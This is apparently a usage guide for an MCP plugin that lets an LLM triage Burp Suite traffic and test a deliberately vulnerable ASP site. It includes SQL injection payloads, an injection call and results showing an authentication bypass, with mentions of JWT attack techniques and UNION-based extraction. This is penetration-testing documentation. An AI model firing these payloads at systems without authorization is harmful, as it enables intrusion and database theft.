# burp-mcp-ColorStrike — Usage Guide

A step-by-step walkthrough of a real testing session using the color-based triage workflow.

---

## Step 1 — Highlight Requests in Burp Proxy History

Browse your target with Burp intercepting. Mark interesting requests with colors directly in Proxy History.

> In this example: 3 highlighted items — `POST /Login.asp` (🟥 RED), `GET /Login.asp` (🟧 ORANGE), `GET /Search.asp` (🟧 ORANGE)

---

## Step 2 — Read History (Triage)

Ask the LLM to read the Burp history. It calls `GetProxyHttpHistory` and returns a color-grouped summary — no values, no body, no response. Just enough to understand what was captured.

```
history burp
```

![History triage](https://github.com/geozin/burp-mcp-colorstrike/blob/main/burp-mcp-ColorStrike-history.png)

The LLM returns two tables:

**General Summary** — grouped by endpoint, showing methods, status codes and identified parameters:

| Method | 🎨 | Base Endpoint | Total Req | Status Codes | Identified Params |
|:-------|:--:|:-------------|:---------:|:------------|:-----------------|
| GET | 🟧🟧 | /Login.asp | 1 | 200 (1) | RetURL |
| GET | 🟧🟧 | /Search.asp | 1 | 200 (1) | tfSearch |
| POST | 🟥 | /Login.asp | 1 | 200 (1) | RetURL |

**Intercepted Traffic** — individual items with IDs, sizes and baseline latency:

| ID | 🎨 | Method | Endpoint | Status | Req Size | Res Size | Time |
|:--|:--:|:-------|:---------|:------:|:--------:|:--------:|:----:|
| #1123 | 🟥 | POST | /Login.asp | 200 | 26b | 3217b | 202ms |
| #1122 | 🟧 | GET | /Login.asp | 200 | 0b | 3196b | 206ms |
| #1031 | 🟧 | GET | /Search.asp | 200 | 0b | 2967b | 206ms |

> **Token cost:** summary-only format — ~500 tokens for 3 items. No body, no response, no JWT.

---

## Step 3 — Analyze by Color Group

Ask the LLM to analyze a specific color group. It calls `GetRequestsByColor` and performs cross-correlation between all items in the group.

```
by orange color
```

![Color analysis](https://github.com/geozin/burp-mcp-colorstrike/blob/main/burp-mcp-ColorStrike-color.png)

The LLM loads the ORANGE group (items #1122 and #1031) and returns:

**Item table with fingerprint and priority:**

| # | 🎨 | Method | Endpoint | Status | Params/Fields | Fingerprint | Pri |
|:-:|:--:|:------:|:---------|:------:|:-------------|:-----------|:---:|
| #1122 | 🟧 | GET | /Login.asp | 200 | RetURL | ASP.NET/IIS | 🟡 |
| #1031 | 🟧 | GET | /Search.asp | 200 | tfSearch | ASP.NET/IIS | 🔴 |

**Detected correlations:**
- Both requests share the same `ASPSESSIONIDASCAATCD` cookie → same user session
- Item #1122 (`/Login.asp`) contains a `RetURL` parameter pointing back to the search page from item #1031 → clear navigational flow → **Open Redirect candidate**

**Response analysis:**
- Parameter `tfSearch` value (`teste`) is directly reflected in the response body → **Reflected XSS and SQLi candidate**
- Both responses leak `Server: Microsoft-IIS/8.5` and `X-Powered-By: ASP.NET`
- Response body contains explicit warning that the site is deliberately vulnerable to SQL Injection

> **Token cost:** full request + response with sanitization pipeline — ~2,000 tokens per item.

---

## Step 4 — Deep Analysis of a Specific Item

Ask the LLM to deep-analyze a specific item by index. It calls `GetRequestByIndex` with the full untruncated request — JWT intact, raw cookies, complete response.

```
request #1123
```

![Deep analysis](https://github.com/geozin/burp-mcp-colorstrike/blob/main/burp-mcp-ColorStrike-deep-analyze.png)

The LLM runs all 6 analysis modules on item #1123 (`POST /Login.asp`):

- **Path:** `/Login.asp?RetURL=%2FSearch%2Easp%3F`
  - Surface: `RetURL` parameter used for post-login redirection — manipulable
  - Vector: **8.10 Open Redirect**

> Full JWT available at this level — use for JWT attacks (alg:none, claim manipulation, RS256→HS256).

---

## Step 5 — Attack with Checkpoint

Ask the LLM to test a specific vector. Before firing any request, the LLM presents a **CHECKPOINT** for your approval.

```
test sql injection
```

![SQLi checkpoint](https://github.com/geozin/burp-mcp-colorstrike/blob/main/burp-mcp-ColorStrike-sql-i-test.png)

The LLM presents the full attack plan before sending anything:

```
⚙️ CHECKPOINT: 🔴 Critical — 8.1 SQL Injection

• IDX:   1123
• HOST:  vulnerable
• EPT:   POST /Login.asp
• INJ:   explicit(body:tfUName)
• Generated payloads:
  + #0  "'"           → Provoke a database error
  + #1  "' OR 1=1--"  → Attempt authentication bypass (classic)
  + #2  "' AND 1=1--" → Test for boolean-based blind SQLi (TRUE condition)
  + #3  "' AND 1=2--" → Test for boolean-based blind SQLi (FALSE condition)

• Injection diff:
  - tfUName=test
  + tfUName={{payload}}

• Call to be executed:
  send_request(
    index    = 1123,
    payloads = ["'", "' OR 1=1--", "' AND 1=1--", "' AND 1=2--"],
    injectAt = "body:tfUName"
  )

⚠️ Proceed with sending? [Y/N]
```

---

## Step 6 — Fire and Analyze Results

Approve with `Y`. The LLM fires `SendRequest` and immediately analyzes the differential response.

```
Y
```

![SQLi results](https://github.com/geozin/burp-mcp-colorstrike/blob/main/burp-mcp-ColorStrike-sql-i.png)

**Results:**

```
⚙️ FIRE: 4 requests sent (0.5s delay) — POSITIVE

• IDX:   1123
• HOST:  vulnerable
• EPT:   POST /Login.asp
• INJ:   explicit(body:tfUName)

REQ  | PAYLOAD        | STATUS | SIZE   | LATENCY | RESULT
─────┼────────────────┼────────┼────────┼─────────┼──────────────────
#0   | '              |  500   | 1208b  | 403ms   | POSITIVE (Error)
#1   | ' OR 1=1--     |  302   |  133b  | 1417ms  | POSITIVE (Bypass)
#2   | ' AND 1=1--    |  200   | 3151b  | 402ms   | NEGATIVE
#3   | ' AND 1=2--    |  200   | 3151b  | 403ms   | NEGATIVE
```

**Evidence:**
- Payload `'` → HTTP 500 Internal Server Error → **error-based SQLi confirmed**
- Payload `' OR 1=1--` → HTTP 302 redirect to `/Search.asp` → **authentication bypass confirmed**. High latency (1417ms vs ~400ms baseline) suggests the database is processing the logic
- Payloads `' AND 1=1--` and `' AND 1=2--` → identical status and size → boolean blind via `AND` may be filtered; try `OR` syntax

**Next steps suggested by LLM:**
- Perform a UNION-based attack to extract database information (version, tables, users)
- Investigate the 500 error body in Burp to check for specific database details (MSSQL, MySQL, etc.)

---

## Summary

| Step | Command | Tool called | Tokens (approx) |
|:-----|:--------|:-----------|:----------------|
| Triage | `history burp` | `GetProxyHttpHistory` | ~500 |
| Color group analysis | `by orange color` | `GetRequestsByColor` | ~4,000 |
| Deep item analysis | `request #1123` | `GetRequestByIndex` | ~5,000 |
| Attack checkpoint | `test sql injection` | *(read only — no fire)* | ~200 |
| Fire + results | `Y` | `SendRequest` | ~800 |

Total for a complete SQLi discovery and confirmation: **~10,500 tokens**.
